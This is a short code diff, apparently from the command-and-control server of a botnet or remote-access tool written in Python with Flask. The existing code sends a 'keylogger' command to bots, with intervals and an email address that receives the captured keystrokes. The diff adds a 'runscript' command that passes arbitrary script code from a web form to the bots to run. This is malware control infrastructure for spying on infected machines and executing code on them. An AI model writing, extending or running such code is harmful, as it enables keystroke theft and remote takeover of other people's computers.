@@ -294,6 +294,8 @@ def _take_cmd(bot, cmd):
 	elif "keylogger" in cmd:
 		return call_script(bot, cmd)
 	
+	elif "runscript" in cmd:
+		return call_script(bot, cmd)
 
 
 	else: return(f"Error: {cmd} is not a valid command")
@@ -375,6 +377,12 @@ def command_check(command):
 		keylogger_intervals 		= request.form.get('keylogger-intervals')
 		keylogger_reciever_email 	= request.form.get('keylogger-reciever-email')
 		return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')
+
+	elif command == "runscript":
+		script_name 	= request.form.get('runscript-name')
+		script_code 	= request.form.get('runscript-code')
+		script_type 	= request.form.get('script-type-selection')
+		return (f'{command} {script_name} {script_type} {script_code}')
 
 	else: return command
 
